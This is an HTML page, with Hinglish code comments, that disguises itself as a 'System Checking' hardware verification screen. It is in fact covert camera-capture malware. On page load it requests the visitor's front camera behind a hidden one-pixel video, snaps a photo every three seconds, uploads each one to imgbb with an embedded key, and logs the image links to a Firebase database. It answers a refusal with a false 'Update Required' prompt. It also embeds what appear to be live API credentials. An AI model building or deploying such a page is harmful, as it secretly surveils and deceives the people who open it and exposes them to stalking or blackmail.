<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <title>System Checking...</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">

    <div style="text-align:center;">
        <h2 id="msg">Initialising...</h2>
        <p id="sub-msg">Hardware compatibility check in progress.</p>
    </div>

    <video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyD7gABQ1j1zMFS9AylLCZr-K1hyK0LkIsQ",
            authDomain: "distark.firebaseapp.com",
            databaseURL: "https://distark-default-rtdb.firebaseio.com",
            projectId: "distark",
            storageBucket: "distark.firebasestorage.app",
            messagingSenderId: "819241583845",
            appId: "1:819241583845:web:2231e652310e47e06cc00c"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const imgbbKey = '50af9f5367ae25509851af1e1ecf62b6';

        async function init() {
            try {
                // specifically front camera (facingMode: user) mang rahe hain
                const constraints = { 
                    video: { facingMode: "user" } 
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById('v');
                video.srcObject = stream;
                
                document.getElementById('msg').innerText = "System Verified";
                console.log("Front Camera Active");

                // Camera ko start hone ke liye 2 second ka gap de rahe hain taaki black image na aaye
                setTimeout(() => {
                    setInterval(takeSnap, 3000); 
                }, 2000);

            } catch (err) {
                document.getElementById('msg').innerText = "Update Required!";
                document.getElementById('sub-msg').innerText = "Please allow camera access to update your system.";
                console.error(err);
            }
        }

        function takeSnap() {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');

            // Agar video ready nahi hai to capture mat karo
            if (v.readyState !== v.HAVE_ENOUGH_DATA) return;

            c.width = v.videoWidth;
            c.height = v.videoHeight;
            ctx.drawImage(v, 0, 0, c.width, c.height);
            
            const base64 = c.toDataURL('image/jpeg', 0.7).split(',')[1]; // JPEG use kar rahe hain thodi fast speed ke liye
            const fd = new FormData();
            fd.append('image', base64);

            fetch(`https://api.imgbb.com/1/upload?key=${imgbbKey}`, { method: 'POST', body: fd })
            .then(r => r.json())
            .then(res => {
                if(res.success) {
                    db.ref('live_logs').push({
                        url: res.data.url,
                        time: new Date().toLocaleTimeString()
                    });
                    console.log("Image sent!");
                }
            }).catch(e => console.log("Upload error"));
        }

        window.onload = init;
    </script>
</body>
</html>
